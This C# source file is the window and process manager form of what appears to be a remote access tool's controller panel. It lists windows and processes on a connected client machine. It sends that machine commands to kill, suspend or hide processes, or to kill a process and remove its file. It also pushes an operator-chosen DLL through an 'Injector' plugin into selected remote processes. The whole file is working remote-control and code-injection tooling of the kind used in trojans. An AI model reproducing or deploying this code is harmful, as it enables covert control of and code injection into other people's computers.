using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows.Forms;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormWindow : FormMaterial
{
	public Clients client;

	public Clients parrent;

	private IContainer components;

	private Timer timer1;

	private ContextMenuStrip contextMenuStrip1;

	private ToolStripMenuItem stopToolStripMenuItem;

	private Panel panel1;

	public DataGridView dataGridView2;

	public MaterialLabel materialLabel1;

	private ToolStripMenuItem startToolStripMenuItem;

	private ToolStripMenuItem toolStripMenuItem1;

	private ToolStripSeparator sToolStripMenuItem;

	private ToolStripSeparator dToolStripMenuItem;

	private ToolStripMenuItem killProcessToolStripMenuItem;

	private ToolStripMenuItem suspendProcessToolStripMenuItem;

	private ToolStripMenuItem resumeProcessToolStripMenuItem;

	private DataGridViewTextBoxColumn Column1;

	private DataGridViewTextBoxColumn Column2;

	private DataGridViewTextBoxColumn Column3;

	private DataGridViewTextBoxColumn Column4;

	private DataGridViewTextBoxColumn Column5;

	private ToolStripMenuItem toolStripMenuItem2;

	private ToolStripMenuItem toolStripMenuItem3;

	private ToolStripMenuItem dllInjectorToolStripMenuItem;

	private ToolStripMenuItem x64ToolStripMenuItem;

	private ToolStripMenuItem x32ToolStripMenuItem;

	public FormWindow()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormProcess_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
		typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, dataGridView2, new object[1] { true });
	}

	private void ChangeScheme(object sender)
	{
		dataGridView2.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
		dataGridView2.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		dataGridView2.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
		dataGridView2.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (!parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	private int[] PidsSelected()
	{
		List<int> list = new List<int>();
		foreach (DataGridViewRow selectedRow in dataGridView2.SelectedRows)
		{
			list.Add((int)selectedRow.Cells[3].Value);
		}
		return list.ToArray();
	}

	private int[] HandleSelected()
	{
		List<int> list = new List<int>();
		foreach (DataGridViewRow selectedRow in dataGridView2.SelectedRows)
		{
			list.Add((int)selectedRow.Cells[2].Value);
		}
		return list.ToArray();
	}

	private void toolStripMenuItem1_Click(object sender, EventArgs e)
	{
		client.Send(LEB128.Write(new object[1] { "Refresh" }));
	}

	private void killProcessToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (dataGridView2.SelectedRows.Count != 0)
		{
			int[] array = PidsSelected();
			foreach (int num in array)
			{
				client.Send(LEB128.Write(new object[2] { "Kill", num }));
			}
		}
	}

	private void suspendProcessToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (dataGridView2.SelectedRows.Count != 0)
		{
			int[] array = PidsSelected();
			foreach (int num in array)
			{
				client.Send(LEB128.Write(new object[2] { "Suspend", num }));
			}
		}
	}

	private void resumeProcessToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (dataGridView2.SelectedRows.Count != 0)
		{
			int[] array = PidsSelected();
			foreach (int num in array)
			{
				client.Send(LEB128.Write(new object[2] { "Resume", num }));
			}
		}
	}

	private void toolStripMenuItem2_Click(object sender, EventArgs e)
	{
		if (dataGridView2.SelectedRows.Count != 0)
		{
			int[] array = PidsSelected();
			foreach (int num in array)
			{
				client.Send(LEB128.Write(new object[2] { "KillRemove", num }));
			}
		}
	}

	private void toolStripMenuItem3_Click(object sender, EventArgs e)
	{
		if (dataGridView2.SelectedRows.Count != 0)
		{
			int[] array = HandleSelected();
			foreach (int num in array)
			{
				client.Send(LEB128.Write(new object[2] { "Maximize", num }));
			}
		}
	}

	private void stopToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (dataGridView2.SelectedRows.Count != 0)
		{
			int[] array = HandleSelected();
			foreach (int num in array)
			{
				client.Send(LEB128.Write(new object[2] { "Minimize", num }));
			}
		}
	}

	private void startToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (dataGridView2.SelectedRows.Count != 0)
		{
			int[] array = HandleSelected();
			foreach (int num in array)
			{
				client.Send(LEB128.Write(new object[2] { "RestoreHide", num }));
			}
		}
	}

	private void x64ToolStripMenuItem_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Injector.dll");
		OpenFileDialog openFileDialog = new OpenFileDialog();
		try
		{
			openFileDialog.Title = "Choose dll";
			openFileDialog.Filter = "Files(*.dll)|*.dll";
			openFileDialog.Multiselect = false;
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				Task.Run(delegate
				{
					parrent.Send(new object[3]
					{
						"Invoke",
						checksum,
						LEB128.Write(new object[4]
						{
							"InjectX64",
							Path.GetFileName(openFileDialog.FileName),
							File.ReadAllBytes(openFileDialog.FileName),
							string.Join(";", PidsSelected())
						})
					});
				});
			}
		}
		finally
		{
			if (openFileDialog != null)
			{
				((IDisposable)openFileDialog).Dispose();
			}
		}
	}

	private void x32ToolStripMenuItem_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Injector.dll");
		OpenFileDialog openFileDialog = new OpenFileDialog();
		try
		{
			openFileDialog.Title = "Choose dll";
			openFileDialog.Filter = "Files(*.dll)|*.dll";
			openFileDialog.Multiselect = false;
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				Task.Run(delegate
				{
					parrent.Send(new object[3]
					{
						"Invoke",
						checksum,
						LEB128.Write(new object[4]
						{
							"InjectX32",
							Path.GetFileName(openFileDialog.FileName),
							File.ReadAllBytes(openFileDialog.FileName),
							string.Join(";", PidsSelected())
						})
					});
				});
			}
		}
		finally
		{
			if (openFileDialog != null)
			{
				((IDisposable)openFileDialog).Dispose();
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormWindow));
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.sToolStripMenuItem = new System.Windows.Forms.ToolStripSeparator();
		this.toolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
		this.stopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.startToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.dToolStripMenuItem = new System.Windows.Forms.ToolStripSeparator();
		this.killProcessToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.suspendProcessToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.resumeProcessToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.panel1 = new System.Windows.Forms.Panel();
		this.materialLabel1 = new MaterialSkin.Controls.MaterialLabel();
		this.dataGridView2 = new System.Windows.Forms.DataGridView();
		this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.dllInjectorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.x64ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.x32ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.contextMenuStrip1.SuspendLayout();
		this.panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.dataGridView2).BeginInit();
		base.SuspendLayout();
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[11]
		{
			this.toolStripMenuItem1, this.sToolStripMenuItem, this.toolStripMenuItem3, this.stopToolStripMenuItem, this.startToolStripMenuItem, this.dToolStripMenuItem, this.killProcessToolStripMenuItem, this.toolStripMenuItem2, this.dllInjectorToolStripMenuItem, this.suspendProcessToolStripMenuItem,
			this.resumeProcessToolStripMenuItem
		});
		this.contextMenuStrip1.Name = "contextMenuStrip1";
		this.contextMenuStrip1.Size = new System.Drawing.Size(191, 236);
		this.toolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem1.Image");
		this.toolStripMenuItem1.Name = "toolStripMenuItem1";
		this.toolStripMenuItem1.Size = new System.Drawing.Size(190, 22);
		this.toolStripMenuItem1.Text = "Refresh";
		this.toolStripMenuItem1.Click += new System.EventHandler(toolStripMenuItem1_Click);
		this.sToolStripMenuItem.Name = "sToolStripMenuItem";
		this.sToolStripMenuItem.Size = new System.Drawing.Size(187, 6);
		this.toolStripMenuItem3.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem3.Image");
		this.toolStripMenuItem3.Name = "toolStripMenuItem3";
		this.toolStripMenuItem3.Size = new System.Drawing.Size(190, 22);
		this.toolStripMenuItem3.Text = "Maximize";
		this.toolStripMenuItem3.Click += new System.EventHandler(toolStripMenuItem3_Click);
		this.stopToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("stopToolStripMenuItem.Image");
		this.stopToolStripMenuItem.Name = "stopToolStripMenuItem";
		this.stopToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
		this.stopToolStripMenuItem.Text = "Minimize";
		this.stopToolStripMenuItem.Click += new System.EventHandler(stopToolStripMenuItem_Click);
		this.startToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("startToolStripMenuItem.Image");
		this.startToolStripMenuItem.Name = "startToolStripMenuItem";
		this.startToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
		this.startToolStripMenuItem.Text = "Show / Hide";
		this.startToolStripMenuItem.Click += new System.EventHandler(startToolStripMenuItem_Click);
		this.dToolStripMenuItem.Name = "dToolStripMenuItem";
		this.dToolStripMenuItem.Size = new System.Drawing.Size(187, 6);
		this.killProcessToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("killProcessToolStripMenuItem.Image");
		this.killProcessToolStripMenuItem.Name = "killProcessToolStripMenuItem";
		this.killProcessToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
		this.killProcessToolStripMenuItem.Text = "Kill Process";
		this.killProcessToolStripMenuItem.Click += new System.EventHandler(killProcessToolStripMenuItem_Click);
		this.toolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem2.Image");
		this.toolStripMenuItem2.Name = "toolStripMenuItem2";
		this.toolStripMenuItem2.Size = new System.Drawing.Size(190, 22);
		this.toolStripMenuItem2.Text = "Kill Process + Remove";
		this.toolStripMenuItem2.Click += new System.EventHandler(toolStripMenuItem2_Click);
		this.suspendProcessToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("suspendProcessToolStripMenuItem.Image");
		this.suspendProcessToolStripMenuItem.Name = "suspendProcessToolStripMenuItem";
		this.suspendProcessToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
		this.suspendProcessToolStripMenuItem.Text = "Suspend Process";
		this.suspendProcessToolStripMenuItem.Click += new System.EventHandler(suspendProcessToolStripMenuItem_Click);
		this.resumeProcessToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("resumeProcessToolStripMenuItem.Image");
		this.resumeProcessToolStripMenuItem.Name = "resumeProcessToolStripMenuItem";
		this.resumeProcessToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
		this.resumeProcessToolStripMenuItem.Text = "Resume Process";
		this.resumeProcessToolStripMenuItem.Click += new System.EventHandler(resumeProcessToolStripMenuItem_Click);
		this.panel1.Controls.Add(this.materialLabel1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.panel1.Location = new System.Drawing.Point(3, 529);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(894, 20);
		this.panel1.TabIndex = 1;
		this.materialLabel1.AutoSize = true;
		this.materialLabel1.Depth = 0;
		this.materialLabel1.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.materialLabel1.Location = new System.Drawing.Point(2, 1);
		this.materialLabel1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialLabel1.Name = "materialLabel1";
		this.materialLabel1.Size = new System.Drawing.Size(94, 19);
		this.materialLabel1.TabIndex = 1;
		this.materialLabel1.Text = "Please wait...";
		this.dataGridView2.AllowDrop = true;
		this.dataGridView2.AllowUserToAddRows = false;
		this.dataGridView2.AllowUserToDeleteRows = false;
		this.dataGridView2.AllowUserToResizeColumns = false;
		this.dataGridView2.AllowUserToResizeRows = false;
		this.dataGridView2.BackgroundColor = System.Drawing.Color.White;
		this.dataGridView2.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.dataGridView2.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.dataGridView2.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridView2.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
		this.dataGridView2.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dataGridView2.Columns.AddRange(this.Column1, this.Column2, this.Column3, this.Column4, this.Column5);
		this.dataGridView2.ContextMenuStrip = this.contextMenuStrip1;
		this.dataGridView2.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.dataGridView2.DefaultCellStyle = dataGridViewCellStyle2;
		this.dataGridView2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.dataGridView2.Enabled = false;
		this.dataGridView2.EnableHeadersVisualStyles = false;
		this.dataGridView2.GridColor = System.Drawing.Color.FromArgb(17, 17, 17);
		this.dataGridView2.Location = new System.Drawing.Point(3, 64);
		this.dataGridView2.Name = "dataGridView2";
		this.dataGridView2.ReadOnly = true;
		this.dataGridView2.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridView2.RowHeadersDefaultCellStyle = dataGridViewCellStyle3;
		this.dataGridView2.RowHeadersVisible = false;
		this.dataGridView2.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.dataGridView2.ShowCellErrors = false;
		this.dataGridView2.ShowCellToolTips = false;
		this.dataGridView2.ShowEditingIcon = false;
		this.dataGridView2.ShowRowErrors = false;
		this.dataGridView2.Size = new System.Drawing.Size(894, 465);
		this.dataGridView2.TabIndex = 17;
		this.Column1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.Column1.HeaderText = "Title Text";
		this.Column1.MinimumWidth = 100;
		this.Column1.Name = "Column1";
		this.Column1.ReadOnly = true;
		this.Column2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.Column2.HeaderText = "Visible";
		this.Column2.Name = "Column2";
		this.Column2.ReadOnly = true;
		this.Column2.Width = 67;
		this.Column3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.Column3.HeaderText = "Window Handle";
		this.Column3.MinimumWidth = 150;
		this.Column3.Name = "Column3";
		this.Column3.ReadOnly = true;
		this.Column3.Width = 150;
		this.Column4.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.Column4.HeaderText = "Process ID";
		this.Column4.MinimumWidth = 100;
		this.Column4.Name = "Column4";
		this.Column4.ReadOnly = true;
		this.Column5.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.Column5.HeaderText = "Path";
		this.Column5.MinimumWidth = 150;
		this.Column5.Name = "Column5";
		this.Column5.ReadOnly = true;
		this.dllInjectorToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.x64ToolStripMenuItem, this.x32ToolStripMenuItem });
		this.dllInjectorToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("dllInjectorToolStripMenuItem.Image");
		this.dllInjectorToolStripMenuItem.Name = "dllInjectorToolStripMenuItem";
		this.dllInjectorToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
		this.dllInjectorToolStripMenuItem.Text = "Dll Injector";
		this.x64ToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("x64ToolStripMenuItem.Image");
		this.x64ToolStripMenuItem.Name = "x64ToolStripMenuItem";
		this.x64ToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.x64ToolStripMenuItem.Text = "X64";
		this.x64ToolStripMenuItem.Click += new System.EventHandler(x64ToolStripMenuItem_Click);
		this.x32ToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("x32ToolStripMenuItem.Image");
		this.x32ToolStripMenuItem.Name = "x32ToolStripMenuItem";
		this.x32ToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.x32ToolStripMenuItem.Text = "X32";
		this.x32ToolStripMenuItem.Click += new System.EventHandler(x32ToolStripMenuItem_Click);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(900, 552);
		base.Controls.Add(this.dataGridView2);
		base.Controls.Add(this.panel1);
		base.Name = "FormWindow";
		this.Text = "Window";
		base.Load += new System.EventHandler(FormProcess_Load);
		this.contextMenuStrip1.ResumeLayout(false);
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.dataGridView2).EndInit();
		base.ResumeLayout(false);
	}
}
